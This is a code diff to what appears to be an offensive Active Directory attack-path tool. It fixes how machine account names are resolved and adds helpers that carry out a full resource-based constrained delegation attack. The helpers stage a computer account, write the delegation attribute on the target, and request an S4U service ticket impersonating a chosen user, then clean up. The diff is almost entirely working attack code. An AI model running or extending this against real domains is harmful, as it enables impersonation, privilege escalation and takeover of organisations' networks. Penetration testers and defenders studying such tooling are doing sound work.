@@ -281,7 +281,15 @@ class BaseEdgeHandler(ABC):
         preceding step.
         """
         node = edge.source
-        if node.label in {"User", "Computer"}:
+        if node.label == "Computer":
+            # BloodHound names computers by FQDN (CASTELBLACK.NORTH...) with no
+            # ``@``; the sAMAccountName is the short host name + ``$``
+            # (CASTELBLACK$), which is how machine accounts are keyed in the
+            # vault and how Kerberos identifies them.  Returning the FQDN here
+            # made every computer-sourced edge fail its credential lookup.
+            short = node.name.split("@")[0].split(".")[0]
+            return short if short.endswith("$") else f"{short}$"
+        if node.label == "User":
             name = node.name
             return name.split("@")[0] if "@" in name else name
         # Non-user source: use the config credential (the user driving the chain)
@@ -341,3 +349,116 @@ class BaseEdgeHandler(ABC):
         """
         parts = self.config.domain.name.split(".")
         return ",".join(f"DC={p}" for p in parts)
+
+    # ------------------------------------------------------------------
+    # Shared RBCD helpers (used by delegation + ACL computer-target paths)
+    # ------------------------------------------------------------------
+
+    @staticmethod
+    def _generate_machine_password(length: int = 16) -> str:
+        """Throwaway password for a staged computer account."""
+        import secrets
+        import string
+
+        alphabet = string.ascii_letters + string.digits
+        return "".join(secrets.choice(alphabet) for _ in range(length)) + "Aa1!"
+
+    async def _delete_staged_computer(self, name: str, write_auth: list[str]) -> bool:
+        """Delete a staged computer account, returning True on success.
+
+        The creating account usually lacks DELETE on the computer (default
+        container ACL), so try the most privileged credentials we hold
+        (Administrator, then the foothold) before falling back to the creator.
+        """
+        from pathstrike.tools import bloodyad_wrapper as bloody
+
+        for who in ("Administrator", None):
+            try:
+                res = await bloody.del_computer(self.config, self._get_auth_args(who), name)
+                if res.get("success"):
+                    return True
+            except Exception:  # pragma: no cover - best-effort cleanup
+                pass
+        try:
+            res = await bloody.del_computer(self.config, write_auth, name)
+            return bool(res.get("success"))
+        except Exception:  # pragma: no cover - best-effort cleanup
+            return False
+
+    async def _rbcd_via_staged_computer(
+        self,
+        *,
+        rbcd_target_sam: str,
+        s4u_spn: str,
+        impersonate: str,
+        domain: str,
+        dc_ip: str,
+        write_auth: list[str],
+        staged_name: str = "rbcd",
+    ) -> tuple[bool, str, str | None]:
+        """Full RBCD attack via a freshly staged computer account.
+
+        Stages a controlled computer (it has an SPN, so it can S4U2Self),
+        points *rbcd_target_sam*'s ``msDS-AllowedToActOnBehalfOfOtherIdentity``
+        at it (using *write_auth* — the credential that holds write access to
+        the target), then S4U2Self+S4U2Proxy *as the staged computer* to
+        *s4u_spn* impersonating *impersonate*.  Always tears down the staged
+        RBCD entry and computer account.
+
+        Returns ``(success, message, ccache_path | None)``.
+        """
+        from pathstrike.tools import bloodyad_wrapper as bloody
+        from pathstrike.tools import impacket_wrapper as impacket
+
+        staged_sam = f"{staged_name}$"
+        staged_pass = self._generate_machine_password()
+
+        add = await bloody.add_computer(self.config, write_auth, staged_name, staged_pass)
+        if not add.get("success"):
+            return (
+                False,
+                f"RBCD: could not create staging computer {staged_sam}: "
+                f"{add.get('error', 'unknown')} (needs ms-DS-MachineAccountQuota > 0).",
+                None,
+            )
+        try:
+            rb = await bloody.set_rbcd(self.config, write_auth, rbcd_target_sam, staged_sam)
+            if not rb.get("success"):
+                return (
+                    False,
+                    f"RBCD: failed to write msDS-AllowedToActOnBehalfOfOtherIdentity "
+                    f"on {rbcd_target_sam}: {rb.get('error', 'unknown')}",
+                    None,
+                )
+            self.logger.info(
+                "RBCD: staged %s, set delegation on %s, S4U → %s (impersonate %s)",
+                staged_sam, rbcd_target_sam, s4u_spn, impersonate,
+            )
+            staged_auth = impacket.build_impacket_auth(
+                domain, staged_sam, staged_pass, None, None, None, dc_ip
+            )
+            st = await impacket.get_st(
+                spn=s4u_spn, impersonate=impersonate, auth_args=staged_auth,
+                domain=domain, username=staged_sam, password=staged_pass, dc_ip=dc_ip,
+            )
+            if not st.get("success"):
+                return False, f"RBCD: S4U via {staged_sam} failed: {st.get('error', 'unknown')}", None
+            ccache = impacket.parse_saved_ccache(st)
+            return (
+                True,
+                f"RBCD attack succeeded: obtained service ticket for {impersonate} "
+                f"to {s4u_spn} (staged {staged_sam} → {rbcd_target_sam})",
+                ccache,
+            )
+        finally:
+            try:
+                await bloody.remove_rbcd(self.config, write_auth, rbcd_target_sam, staged_sam)
+            except Exception as exc:  # pragma: no cover - best-effort cleanup
+                self.logger.warning("RBCD cleanup: remove_rbcd failed: %s", exc)
+            if await self._delete_staged_computer(staged_name, write_auth):
+                self.logger.info("RBCD: cleaned up staged computer %s", staged_sam)
+            else:
+                self.logger.warning(
+                    "RBCD: could not delete staged computer %s — remove it "
+                    "manually: bloodyAD remove object '%s'", staged_sam, staged_sam,
+                )
